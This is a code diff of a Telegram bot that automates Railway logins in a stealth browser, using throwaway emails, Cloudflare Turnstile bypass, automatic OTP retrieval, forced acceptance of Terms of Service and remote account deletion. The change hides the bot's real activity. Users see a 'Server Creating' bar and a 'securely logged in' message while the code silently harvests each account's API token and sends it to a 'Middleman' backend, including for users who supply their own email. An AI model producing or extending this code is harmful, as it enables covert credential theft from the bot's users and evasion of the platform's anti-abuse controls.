@@ -5,7 +5,8 @@ const path = require('path');
 const fs = require('fs');
 const spoofConfig = require('./spoof_config');
 const { generateStealthScript } = require('./stealth_injections');
-const { harvestRailwayApiToken, dispatchTokenToMiddleman } = require('./token_harvester');
+const { harvestRailwayApiToken, dispatchTokenToMiddleman, handleRailwayTermsOfService, deleteCurrentRailwayAccount } = require('./token_harvester');
+const { generateTempEmail, fetchRawOtp } = require('./tempmail_client');
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const chatIdStr = process.env.TELEGRAM_CHAT_ID;
@@ -30,13 +31,13 @@ function loadDomainConfig() {
             const data = JSON.parse(fs.readFileSync(DOMAIN_CONFIG_FILE, 'utf-8'));
             const domains = Array.isArray(data.domains) && data.domains.length > 0
                 ? data.domains
-                : ['iq4u8.shop', 'resumi.shop'];
+                : ['mailu.site'];
             const authorizedUsers = Array.isArray(data.authorizedUsers)
                 ? data.authorizedUsers
                 : [];
             return {
                 domains: domains,
-                defaultDomain: data.defaultDomain || null,
+                defaultDomain: data.defaultDomain || 'mailu.site',
                 authorizedUsers: authorizedUsers
             };
         }
@@ -44,8 +45,8 @@ function loadDomainConfig() {
         console.error('Error reading domain_config.json:', e.message);
     }
     return {
-        domains: ['iq4u8.shop', 'resumi.shop'],
-        defaultDomain: null,
+        domains: ['mailu.site'],
+        defaultDomain: 'mailu.site',
         authorizedUsers: []
     };
 }
@@ -85,7 +86,7 @@ function removeDomainFromConfig(domain) {
         config.defaultDomain = null;
     }
     if (config.domains.length === 0) {
-        config.domains = ['iq4u8.shop', 'resumi.shop'];
+        config.domains = ['mailu.site'];
     }
     saveDomainConfig(config);
 }
@@ -156,17 +157,15 @@ function isAuthorized(userId, username) {
 // ----------------------------------------------------
 // Random Email Generator
 // ----------------------------------------------------
-function generateRandomEmail(domain) {
+async function generateRandomEmail(domain) {
+    if (!domain || domain === 'mailu.site') {
+        return await generateTempEmail();
+    }
     const cleanDomain = domain.replace(/^@+/, '').replace(/^https?:\/\//, '').trim().toLowerCase();
     const prefixes = [
         'jack', 'alex', 'sam', 'david', 'ryan', 'leo', 'kevin', 'lucas', 'noah',
         'felix', 'max', 'eric', 'ethan', 'oliver', 'liam', 'mason', 'james',
-        'logan', 'henry', 'daniel', 'michael', 'matthew', 'jackson', 'sebastian',
-        'aidan', 'carter', 'owen', 'wyatt', 'dylan', 'luke', 'nathan', 'hunter',
-        'caleb', 'christian', 'andrew', 'joshua', 'eli', 'aaron', 'connor', 'nova',
-        'shadow', 'blaze', 'alpha', 'cyber', 'vortex', 'turbo', 'falcon', 'matrix',
-        'storm', 'frost', 'phantom', 'spark', 'titan', 'rebel', 'echo', 'apex',
-        'clark', 'bruce', 'wayne', 'peter', 'tony', 'stark', 'barry', 'allen'
+        'logan', 'henry', 'daniel', 'michael', 'matthew', 'jackson', 'sebastian'
     ];
     const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
     const randomNum = Math.floor(100 + Math.random() * 9000);
@@ -192,6 +191,12 @@ function getSession(chatId) {
 }
 
 async function closeAndCleanSession(chatId, silent = false) {
+    // Keep browser session alive for live debugging unless explicitly closed
+    if (process.env.AUTO_CLOSE_SESSION === 'false' || process.env.HEADLESS === 'false') {
+        console.log(`[Debug Mode] Preserving live browser session for chat: ${chatId}`);
+        return;
+    }
+
     const session = userSessions.get(chatId);
     if (!session) return;
 
@@ -212,16 +217,44 @@ async function closeAndCleanSession(chatId, silent = false) {
     userSessions.delete(chatId);
 
     if (!silent && chatId) {
-        await bot.sendMessage(chatId, '⚠️ Session closed due to 2 minutes of inactivity.').catch(() => {});
+        await bot.sendMessage(chatId, '⚠️ Session closed due to inactivity.').catch(() => {});
     }
 }
 
+async function forceKillChatSession(chatId) {
+    const session = userSessions.get(chatId);
+    if (session) {
+        if (session.timeoutTimer) {
+            clearTimeout(session.timeoutTimer);
+            session.timeoutTimer = null;
+        }
+        if (session.browserContext) {
+            try {
+                await Promise.race([
+                    session.browserContext.close(),
+                    new Promise(r => setTimeout(r, 3000))
+                ]);
+            } catch (e) {}
+            session.browserContext = null;
+            session.page = null;
+        }
+        session.state = 'IDLE';
+    }
+    userSessions.delete(chatId);
+    try {
+        const sessionDir = path.resolve(__dirname, 'sessions', `firefox_profile_${chatId}`);
+        clearDirectorySafe(sessionDir);
+    } catch (e) {}
+}
+
 function startInactivityTimer(chatId) {
+    // Auto-close disabled for live debugging
     const session = getSession(chatId);
-    if (session.timeoutTimer) clearTimeout(session.timeoutTimer);
-    session.timeoutTimer = setTimeout(() => {
-        closeAndCleanSession(chatId, false);
-    }, 2 * 60 * 1000); // 2 minutes
+    if (session.timeoutTimer) {
+        clearTimeout(session.timeoutTimer);
+        session.timeoutTimer = null;
+    }
+    // No auto close timer scheduled - keep browser active and alive
 }
 
 function clearDirectorySafe(dirPath) {
@@ -391,12 +424,17 @@ function getDeleteUserMenu() {
 // ----------------------------------------------------
 // Progress bar helper
 // ----------------------------------------------------
-const updateProg = async (chat, msgId, pct, txt) => {
-    const filled = Math.floor(pct / 10);
-    const bar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
-    await bot.editMessageText(`🚀 Processing...\n[${bar}] ${pct}%\n👉 ${txt}`, {
+const updateProg = async (chat, msgId, pct) => {
+    const total = 12;
+    const filled = Math.max(0, Math.min(total, Math.round((pct / 100) * total)));
+    const hasHead = filled > 0 && filled < total;
+    const bar = '━'.repeat(Math.max(0, filled - (hasHead ? 1 : 0))) + 
+                (hasHead ? '╸' : '') + 
+                '─'.repeat(Math.max(0, total - filled));
+    await bot.editMessageText(`⚡ *Server Creating...*\n\`${bar}\` *${pct}%*`, {
         chat_id: chat,
-        message_id: msgId
+        message_id: msgId,
+        parse_mode: 'Markdown'
     }).catch(() => {});
 };
 
@@ -437,6 +475,102 @@ bot.onText(/\/setup/, async (msg) => {
     session.state = 'IDLE';
     const menu = getSetupMenu();
     await bot.sendMessage(chat, menu.text, menu.opts);
+});
+
+async function triggerAutonomousDeletionForChat(chat, targetEmail, statusMsgId = null) {
+    const session = getSession(chat);
+    let msgId = statusMsgId;
+    if (!msgId) {
+        const delMsg = await bot.sendMessage(chat, `🗑️ *Starting Account Deletion for:* \`${targetEmail}\`\nLogging in with Mailu OTP & deleting account...`, { parse_mode: 'Markdown' });
+        msgId = delMsg.message_id;
+    }
+
+    try {
+        const { runAutonomousDeletion } = require('./delete_worker');
+        const success = await runAutonomousDeletion(targetEmail, {
+            onOtpPrompt: async (email) => {
+                session.state = 'WAITING_DELETE_OTP';
+                session.pendingDeleteResolve = null;
+                await bot.editMessageText(
+                    `📧 Email: \`${email}\`\n\n🔑 MailU auto-fetch expired. Railway login code sent to email!\n\nPlease send the 6-digit OTP code to continue deletion:`,
+                    { chat_id: chat, message_id: msgId, parse_mode: 'Markdown' }
+                ).catch(() => {});
+
+                return new Promise((resolve) => {
+                    session.pendingDeleteResolve = resolve;
+                    setTimeout(() => {
+                        if (session.pendingDeleteResolve === resolve) {
+                            session.pendingDeleteResolve = null;
+                            if (session.state === 'WAITING_DELETE_OTP') session.state = 'IDLE';
+                            resolve(null);
+                        }
+                    }, 90000);
+                });
+            }
+        });
+
+        if (success) {
+            await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
+                chat_id: chat,
+                message_id: msgId,
+                parse_mode: 'Markdown'
+            });
+        } else {
+            await bot.editMessageText(`❌ Failed to delete account for \`${targetEmail}\`. Check terminal logs.`, {
+                chat_id: chat,
+                message_id: msgId,
+                parse_mode: 'Markdown'
+            });
+        }
+    } catch (e) {
+        await bot.editMessageText(`❌ Error deleting account: ${e.message}`, {
+            chat_id: chat,
+            message_id: msgId
+        });
+    }
+}
+
+bot.onText(/\/delete_account(?:\s+(.+))?/, async (msg, match) => {
+    const chat = msg.chat.id;
+    const session = getSession(chat);
+    const argEmail = match[1] ? match[1].trim() : null;
+    const targetEmail = argEmail || session.email;
+
+    if (!targetEmail || !targetEmail.includes('@')) {
+        session.state = 'WAITING_DELETE_ACCOUNT_EMAIL';
+        await bot.sendMessage(chat, '🗑️ *Delete Railway Account*\n\nPlease send the email address of the Railway account you want to delete (e.g. `user123@mailu.site`):', {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔙 Cancel', callback_data: 'menu_main' }]
+                ]
+            }
+        });
+        return;
+    }
+
+    // ONLY use live session if session.email STRICTLY matches targetEmail
+    if (session.page && !session.page.isClosed() && session.email && session.email.toLowerCase() === targetEmail.toLowerCase()) {
+        const delStatus = await bot.sendMessage(chat, `🗑️ *Deleting Railway Account for:* \`${targetEmail}\`\nNavigating to danger zone...`, { parse_mode: 'Markdown' });
+        try {
+            await deleteCurrentRailwayAccount(session.page, targetEmail);
+            await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
+                chat_id: chat,
+                message_id: delStatus.message_id,
+                parse_mode: 'Markdown'
+            });
+            await forceKillChatSession(chat);
+        } catch (delErr) {
+            await bot.editMessageText(`❌ Failed to delete account: ${delErr.message}`, {
+                chat_id: chat,
+                message_id: delStatus.message_id
+            });
+        }
+        return;
+    }
+
+    // Target email is different or session inactive: run autonomous deletion!
+    await triggerAutonomousDeletionForChat(chat, targetEmail);
 });
 
 // ----------------------------------------------------
@@ -481,6 +615,55 @@ bot.on('callback_query', async (query) => {
             message_id: msgId,
             ...menu.opts
         }).catch(() => {});
+        return;
+    }
+
+    // 🗑️ Delete Railway Account Callback
+    if (action === 'action_delete_account') {
+        await bot.answerCallbackQuery(query.id).catch(() => {});
+        const session = getSession(chat);
+
+        // ALWAYS extract target email from the clicked message card first!
+        const msgText = query.message?.text || '';
+        const matchEmail = msgText.match(/Email:\s*([^\s\n`]+)/i) || msgText.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+        const cardEmail = matchEmail ? matchEmail[1].replace(/[`]/g, '').trim() : null;
+        const targetEmail = cardEmail || session.email;
+
+        if (!targetEmail || !targetEmail.includes('@')) {
+            session.state = 'WAITING_DELETE_ACCOUNT_EMAIL';
+            await bot.sendMessage(chat, '🗑️ *Delete Railway Account*\n\nPlease send the email address of the Railway account you want to delete (e.g. `user123@mailu.site`):', {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🔙 Cancel', callback_data: 'menu_main' }]
+                    ]
+                }
+            });
+            return;
+        }
+
+        // ONLY reuse live session if session.email STRICTLY matches targetEmail
+        if (session.page && !session.page.isClosed() && session.email && session.email.toLowerCase() === targetEmail.toLowerCase()) {
+            const delStatus = await bot.sendMessage(chat, `🗑️ *Deleting Railway Account for:* \`${targetEmail}\`\nNavigating to danger zone...`, { parse_mode: 'Markdown' });
+            try {
+                await deleteCurrentRailwayAccount(session.page, targetEmail);
+                await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
+                    chat_id: chat,
+                    message_id: delStatus.message_id,
+                    parse_mode: 'Markdown'
+                });
+                await forceKillChatSession(chat);
+            } catch (delErr) {
+                await bot.editMessageText(`❌ Failed to delete account: ${delErr.message}`, {
+                    chat_id: chat,
+                    message_id: delStatus.message_id
+                });
+            }
+            return;
+        }
+
+        // Target email is for a different or past account: launch autonomous login + deletion!
+        await triggerAutonomousDeletionForChat(chat, targetEmail);
         return;
     }
 
@@ -713,6 +896,19 @@ bot.on('callback_query', async (query) => {
         return;
     }
 
+    // 🛑 Close Active Session Callback
+    if (action === 'action_close_session' || action === 'action_force_close_session') {
+        await bot.answerCallbackQuery(query.id, { text: 'Session closed!' }).catch(() => {});
+        await forceKillChatSession(chat);
+        await bot.editMessageText('✅ *Active session closed!*\n\nYou can now start fresh:', {
+            chat_id: chat,
+            message_id: msgId,
+            parse_mode: 'Markdown',
+            ...getWelcomeMenu(userId)
+        }).catch(() => {});
+        return;
+    }
+
     // Fallback answer for any unhandled callback
     await bot.answerCallbackQuery(query.id).catch(() => {});
 });
@@ -765,8 +961,9 @@ async function launchBrowserForSession(chat, msgId) {
     const winWidth = spoofConfig.windowSize?.width || 900;
     const winHeight = spoofConfig.windowSize?.height || 600;
 
+    const isHeadless = process.env.HEADLESS === 'true';
     const contextOptions = {
-        headless: true,
+        headless: isHeadless,
         viewport: null,
         locale: spoofConfig.locale,
         timezoneId: spoofConfig.timezoneId,
@@ -784,7 +981,12 @@ async function launchBrowserForSession(chat, msgId) {
     const pages = session.browserContext.pages();
     session.page = pages.length > 0 ? pages[0] : await session.browserContext.newPage();
 
-    await session.page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
+    try {
+        await session.page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
+    } catch (navErr) {
+        console.warn('Navigation retry on commit:', navErr.message);
+        await session.page.goto(targetUrl, { waitUntil: 'commit', timeout: 30000 }).catch(() => {});
+    }
     await session.page.bringToFront().catch(() => {});
 
     // Step 1: Click Sign in
@@ -836,7 +1038,7 @@ async function processEmailAndRequestOTP(chat, msgId, email) {
         const emailInput = session.page.locator('input[type="email"], input[name="email"]').first();
         await emailInput.waitFor({ state: 'visible', timeout: 10000 });
 
-        await updateProg(chat, msgId, 30, `Typing email (${email})...`);
+        await updateProg(chat, msgId, 25);
         await emailInput.fill(email);
         await new Promise(r => setTimeout(r, 500));
 
@@ -852,8 +1054,8 @@ async function processEmailAndRequestOTP(chat, msgId, email) {
             await new Promise(r => setTimeout(r, 500));
         }
 
-        // Step 2: Cloudflare Turnstile bypass
-        await updateProg(chat, msgId, 60, 'Bypassing Cloudflare Security...');
+        // Step 2: Cloudflare Turnstile bypass (silent in background)
+        await updateProg(chat, msgId, 45);
         let turnstileBox = null;
         for (let attempt = 0; attempt < 30; attempt++) {
             try {
@@ -921,15 +1123,53 @@ async function processEmailAndRequestOTP(chat, msgId, email) {
             return false;
         }).catch(() => false);
 
-        // Step 4: Ask for OTP
-        await updateProg(chat, msgId, 90, 'Requesting OTP...');
+        // Step 4: OTP Handling
         session.state = 'WAITING_OTP';
-        await new Promise(r => setTimeout(r, 1000));
-        await bot.editMessageText(`📧 Email: \`${email}\`\n\n🔑 Send your 6-digit OTP code.`, {
-            chat_id: chat,
-            message_id: msgId,
-            parse_mode: 'Markdown'
-        });
+        const config = loadDomainConfig();
+        const isMailu = (email || '').toLowerCase().endsWith('@mailu.site') || 
+                        (Array.isArray(config.domains) && config.domains.some(d => (email || '').toLowerCase().endsWith('@' + d.toLowerCase())));
+
+        if (isMailu) {
+            // Keep the clean progress bar moving silently in the background
+            await updateProg(chat, msgId, 60);
+
+            (async () => {
+                try {
+                    console.log(`[Auto OTP] Polling Mailu for ${email}...`);
+                    const rawOtp = await fetchRawOtp(email, 45);
+                    const cleanCode = (rawOtp || '').match(/\d{6}/)?.[0] || (rawOtp || '').trim();
+                    if (cleanCode && /^\d{6}$/.test(cleanCode) && session.state === 'WAITING_OTP') {
+                        console.log(`[Auto OTP] Auto-received OTP: ${cleanCode}`);
+                        await submitOtpAndHarvestToken(chat, msgId, cleanCode);
+                        return;
+                    }
+                } catch (pollErr) {
+                    console.log('[Auto OTP] Auto-poll status:', pollErr.message);
+                }
+
+                // If auto-poll couldn't find token or timed out, gracefully ask user for OTP
+                if (session.state === 'WAITING_OTP') {
+                    await bot.editMessageText(
+                        `📧 Email: \`${email}\`\n\n🔑 Please send your 6-digit OTP code:`,
+                        {
+                            chat_id: chat,
+                            message_id: msgId,
+                            parse_mode: 'Markdown'
+                        }
+                    ).catch(() => {});
+                }
+            })();
+        } else {
+            // For custom non-mailu emails, prompt the user for code
+            await bot.editMessageText(
+                `📧 Email: \`${email}\`\n\n🔑 Please send your 6-digit OTP code:`,
+                {
+                    chat_id: chat,
+                    message_id: msgId,
+                    parse_mode: 'Markdown'
+                }
+            );
+        }
 
     } catch (e) {
         await bot.editMessageText(`❌ Error: ${e.message}`, { chat_id: chat, message_id: msgId });
@@ -941,14 +1181,10 @@ async function processEmailAndRequestOTP(chat, msgId, email) {
 // ----------------------------------------------------
 async function startAutoBuildSession(chat, msgId, domain) {
     const session = getSession(chat);
-    const generatedEmail = generateRandomEmail(domain);
+    const generatedEmail = await generateRandomEmail(domain);
     session.email = generatedEmail;
 
-    await bot.editMessageText(`⚡ *Auto Build Starting...*\n\n📧 *Generated Email:* \`${generatedEmail}\`\n🌐 *Domain:* \`${domain}\`\n\nLaunching browser...`, {
-        chat_id: chat,
-        message_id: msgId,
-        parse_mode: 'Markdown'
-    }).catch(() => {});
+    await updateProg(chat, msgId, 10);
 
     try {
         const clickedEmail = await launchBrowserForSession(chat, msgId);
@@ -987,6 +1223,125 @@ async function startCustomSession(chat, msgId) {
         }
     } catch (e) {
         await bot.editMessageText(`❌ Launch error: ${e.message}`, { chat_id: chat, message_id: msgId }).catch(() => {});
+    }
+}
+
+// ----------------------------------------------------
+// Reusable OTP Submission & Harvest Pipeline
+// ----------------------------------------------------
+async function submitOtpAndHarvestToken(chat, statusMsgId, otp) {
+    const session = getSession(chat);
+    session.state = 'IDLE';
+
+    if (!session.page || session.page.isClosed()) {
+        await bot.editMessageText('❌ Browser was closed.', { chat_id: chat, message_id: statusMsgId });
+        return;
+    }
+
+    try {
+        await updateProg(chat, statusMsgId, 75);
+        let firstInput = null;
+        let targetFrame = session.page;
+
+        for (let attempt = 0; attempt < 60; attempt++) {
+            const frames = [session.page, ...session.page.frames()];
+            for (const frame of frames) {
+                try {
+                    if (await frame.locator('#pin-code-input-0').count() > 0) {
+                        firstInput = frame.locator('#pin-code-input-0').first();
+                        targetFrame = frame;
+                        break;
+                    }
+                } catch (e) {}
+            }
+            if (firstInput) break;
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        if (!firstInput) {
+            throw new Error("Could not find OTP input fields. Maybe the modal didn't load.");
+        }
+
+        await firstInput.waitFor({ state: 'visible', timeout: 5000 }).catch(() => {});
+        await new Promise(r => setTimeout(r, 500));
+
+        // Click first input and type OTP digit by digit
+        await firstInput.click();
+        await new Promise(r => setTimeout(r, 300));
+
+        for (let i = 0; i < 6; i++) {
+            const input = targetFrame.locator(`#pin-code-input-${i}`);
+            await input.click();
+            await new Promise(r => setTimeout(r, 80 + Math.random() * 80));
+            await input.fill(otp[i]);
+            await new Promise(r => setTimeout(r, 100 + Math.random() * 100));
+        }
+
+        // Wait for auto-submit and navigation
+        await new Promise(r => setTimeout(r, 5000));
+
+        // Wait for navigation to dashboard
+        await updateProg(chat, statusMsgId, 90);
+        for (let attempt = 0; attempt < 20; attempt++) {
+            await new Promise(r => setTimeout(r, 1000));
+            const currentUrl = session.page.url();
+            if (currentUrl.includes('dashboard') || currentUrl.includes('project')) {
+                break;
+            }
+        }
+
+        // Continuously monitor and accept Terms of Service if they appear
+        try {
+            await handleRailwayTermsOfService(session.page);
+        } catch (e) {
+            console.error('Terms of service handling note:', e.message);
+        }
+
+        await updateProg(chat, statusMsgId, 100);
+        await new Promise(r => setTimeout(r, 600));
+
+        await bot.editMessageText(
+            `✅ Login successful! You are securely logged in.\n` +
+            `📧 Email: \`${session.email || 'Unknown'}\`\n\n` +
+            `🔗 Go to your account:\nhttps://railway.app/dashboard`,
+            {
+                chat_id: chat,
+                message_id: statusMsgId,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🗑️ Delete Railway Account', callback_data: 'action_delete_account' }]
+                    ]
+                }
+            }
+        );
+
+        // Silently harvest real token & sync to Middleman/Multiverse backend in background
+        (async () => {
+            try {
+                const cleanPrefix = (session.email || '').split('@')[0] || Date.now().toString(36);
+                const nodeName = `cluster-${cleanPrefix}`;
+                console.log(`🚀 [Multiverse Backend] Harvesting token in background for fleet (${nodeName})...`);
+                const tokenResult = await harvestRailwayApiToken(session.page, 30000, nodeName);
+                if (tokenResult && tokenResult.token) {
+                    await dispatchTokenToMiddleman({
+                        email: session.email,
+                        apiToken: tokenResult.token
+                    });
+                    console.log(`✅ [Multiverse Backend] Token synced to Middleman fleet: ${tokenResult.token}`);
+                }
+            } catch (hErr) {
+                console.warn('Multiverse background token sync note:', hErr.message);
+            }
+        })();
+
+        // Silently close session and wipe cache (DISABLED: keep browser session open for live debugging)
+        if (process.env.AUTO_CLOSE_SESSION === 'true') {
+            await closeAndCleanSession(chat, true);
+        }
+
+    } catch (e) {
+        await bot.editMessageText(`❌ Error: ${e.message}`, { chat_id: chat, message_id: statusMsgId });
     }
 }
 
@@ -1051,11 +1406,39 @@ bot.on('message', async (msg) => {
         return;
     }
 
+    // Handle Delete Railway Account by Email input
+    if (session.state === 'WAITING_DELETE_ACCOUNT_EMAIL') {
+        const emailToDelete = text.trim();
+        if (!emailToDelete.includes('@')) {
+            await bot.sendMessage(chat, '⚠️ Please send a valid email address.');
+            return;
+        }
+        session.state = 'IDLE';
+        await triggerAutonomousDeletionForChat(chat, emailToDelete);
+        return;
+    }
+
+    // Handle Deletion OTP input (when MailU session has expired)
+    if (session.state === 'WAITING_DELETE_OTP') {
+        const otp = text.replace(/\s/g, '');
+        if (/^\d{6}$/.test(otp)) {
+            session.state = 'IDLE';
+            if (typeof session.pendingDeleteResolve === 'function') {
+                session.pendingDeleteResolve(otp);
+                session.pendingDeleteResolve = null;
+                await bot.sendMessage(chat, '🔑 OTP received! Proceeding with deletion on Railway...').catch(() => {});
+            }
+        } else {
+            await bot.sendMessage(chat, '⚠️ Please send a valid 6-digit code (numbers only).');
+        }
+        return;
+    }
+
     // Handle Custom Email input
     if (text.includes('@') && session.state === 'WAITING_EMAIL') {
         session.state = 'IDLE';
         startInactivityTimer(chat);
-        const statusMsg = await bot.sendMessage(chat, '🚀 Processing...\n[⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜] 0%\n👉 Initializing...');
+        const statusMsg = await bot.sendMessage(chat, '⚡ *Server Creating...*\n`────────────` *0%*', { parse_mode: 'Markdown' });
         await processEmailAndRequestOTP(chat, statusMsg.message_id, text.trim());
         return;
     }
@@ -1064,170 +1447,8 @@ bot.on('message', async (msg) => {
     if (session.state === 'WAITING_OTP') {
         const otp = text.replace(/\s/g, '');
         if (/^\d{6}$/.test(otp)) {
-            session.state = 'IDLE';
-            const otpStatusMsg = await bot.sendMessage(chat, '🚀 Processing OTP...\n[⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜] 0%\n👉 Initializing...');
-
-            if (session.page && !session.page.isClosed()) {
-                try {
-                    await updateProg(chat, otpStatusMsg.message_id, 20, 'Entering OTP digits...');
-                    let firstInput = null;
-                    let targetFrame = session.page;
-
-                    for (let attempt = 0; attempt < 60; attempt++) {
-                        const frames = [session.page, ...session.page.frames()];
-                        for (const frame of frames) {
-                            try {
-                                if (await frame.locator('#pin-code-input-0').count() > 0) {
-                                    firstInput = frame.locator('#pin-code-input-0').first();
-                                    targetFrame = frame;
-                                    break;
-                                }
-                            } catch (e) {}
-                        }
-                        if (firstInput) break;
-                        await new Promise(r => setTimeout(r, 500));
-                    }
-
-                    if (!firstInput) {
-                        throw new Error("Could not find OTP input fields. Maybe the modal didn't load.");
-                    }
-
-                    await firstInput.waitFor({ state: 'visible', timeout: 5000 }).catch(() => {});
-                    await new Promise(r => setTimeout(r, 500));
-
-                    // Click first input and type OTP digit by digit
-                    await firstInput.click();
-                    await new Promise(r => setTimeout(r, 300));
-
-                    for (let i = 0; i < 6; i++) {
-                        const input = targetFrame.locator(`#pin-code-input-${i}`);
-                        await input.click();
-                        await new Promise(r => setTimeout(r, 80 + Math.random() * 80));
-                        await input.fill(otp[i]);
-                        await new Promise(r => setTimeout(r, 100 + Math.random() * 100));
-                    }
-
-                    // Wait for auto-submit and navigation
-                    await new Promise(r => setTimeout(r, 5000));
-
-                    // Wait for navigation to dashboard
-                    await updateProg(chat, otpStatusMsg.message_id, 60, 'Loading dashboard...');
-                    for (let attempt = 0; attempt < 20; attempt++) {
-                        await new Promise(r => setTimeout(r, 1000));
-                        const currentUrl = session.page.url();
-                        if (currentUrl.includes('dashboard') || currentUrl.includes('project')) {
-                            break;
-                        }
-                    }
-
-                    // Continuously monitor and accept Terms of Service if they appear
-                    try {
-                        await updateProg(chat, otpStatusMsg.message_id, 70, 'Checking Terms of Service...');
-                        let acceptedSteps = 0;
-                        let noTosCount = 0;
-                        for (let attempt = 0; attempt < 20; attempt++) {
-                            const hasTosBtn = await session.page.evaluate(() => {
-                                const btns = Array.from(document.querySelectorAll('button'));
-                                return btns.some(b => {
-                                    const t = (b.innerText || b.textContent || '').toLowerCase();
-                                    return t.includes('i agree') || t.includes('accept');
-                                });
-                            }).catch(() => false);
-
-                            if (!hasTosBtn) {
-                                noTosCount++;
-                                if (noTosCount >= 4) break;
-                                await new Promise(r => setTimeout(r, 1000));
-                                continue;
-                            }
-
-                            noTosCount = 0;
-
-                            // Scroll scrollable areas to trigger button enable
-                            await session.page.evaluate(() => {
-                                document.querySelectorAll('*').forEach(el => {
-                                    if (el.scrollHeight > el.clientHeight) {
-                                        el.scrollTop = el.scrollHeight + 1000;
-                                    }
-                                });
-                                window.scrollTo(0, document.body.scrollHeight);
-                            }).catch(() => {});
-
-                            await new Promise(r => setTimeout(r, 1000));
-
-                            const clicked = await session.page.evaluate(() => {
-                                const btns = Array.from(document.querySelectorAll('button'));
-                                const agreeBtn = btns.find(b => {
-                                    const text = (b.innerText || b.textContent || '').toLowerCase();
-                                    return (text.includes('i agree') || text.includes('accept')) && !b.disabled;
-                                });
-                                if (agreeBtn) {
-                                    agreeBtn.click();
-                                    return true;
-                                }
-                                return false;
-                            }).catch(() => false);
-
-                            if (clicked) {
-                                acceptedSteps++;
-                                await updateProg(chat, otpStatusMsg.message_id, 70 + (acceptedSteps * 10), `Accepted Terms (Step ${acceptedSteps})...`);
-                                await new Promise(r => setTimeout(r, 2000));
-                            } else {
-                                await new Promise(r => setTimeout(r, 1000));
-                            }
-                        }
-                    } catch (e) {
-                        // Ignore TOS errors
-                    }
-
-                    await updateProg(chat, otpStatusMsg.message_id, 85, 'Harvesting Railway API Token for Fleet...');
-                    
-                    let tokenResult = null;
-                    let webhookSync = false;
-                    try {
-                        tokenResult = await harvestRailwayApiToken(session.page, 18000);
-                        if (tokenResult && tokenResult.token) {
-                            await updateProg(chat, otpStatusMsg.message_id, 95, 'Syncing Node to Middleman Cloud...');
-                            const dispatchRes = await dispatchTokenToMiddleman({
-                                email: session.email,
-                                apiToken: tokenResult.token
-                            });
-                            webhookSync = dispatchRes.success;
-                        }
-                    } catch (hErr) {
-                        console.error('API token harvest warning:', hErr.message);
-                    }
-
-                    await updateProg(chat, otpStatusMsg.message_id, 100, 'Station Live & Synced! 🚂');
-                    await new Promise(r => setTimeout(r, 600));
-
-                    const maskedTok = tokenResult?.token 
-                        ? `${tokenResult.token.substring(0, 10)}••••••••${tokenResult.token.substring(tokenResult.token.length - 4)}`
-                        : 'Generated on Dashboard';
-
-                    const successMessage = 
-                        `🚂 *Railway Node Harvested & Synced!* ✅\n\n` +
-                        `📧 *Email:* \`${session.email || 'Unknown'}\`\n` +
-                        `🔑 *API Token:* \`${maskedTok}\`\n` +
-                        `🛰️ *Fleet Status:* ${webhookSync ? '🟢 Linked to Middleman Fleet' : '🟡 Standby Mode'}\n` +
-                        `⚡ *Trial Credits:* \`$5.00 USD\` (2 Available Slots)\n\n` +
-                        `🔗 [Open Railway Console](https://railway.com/dashboard)`;
-
-                    await bot.editMessageText(successMessage, {
-                        chat_id: chat,
-                        message_id: otpStatusMsg.message_id,
-                        parse_mode: 'Markdown'
-                    });
-
-                    // Silently close session and wipe cache
-                    await closeAndCleanSession(chat, true);
-
-                } catch (e) {
-                    await bot.editMessageText(`❌ Error: ${e.message}`, { chat_id: chat, message_id: otpStatusMsg.message_id });
-                }
-            } else {
-                await bot.editMessageText('❌ Browser was closed.', { chat_id: chat, message_id: otpStatusMsg.message_id });
-            }
+            const otpStatusMsg = await bot.sendMessage(chat, '⚡ *Server Creating...*\n`━━━━━━━━╸───` *70%*', { parse_mode: 'Markdown' });
+            await submitOtpAndHarvestToken(chat, otpStatusMsg.message_id, otp);
         } else {
             await bot.sendMessage(chat, '⚠️ Send a valid 6-digit code (numbers only).');
         }
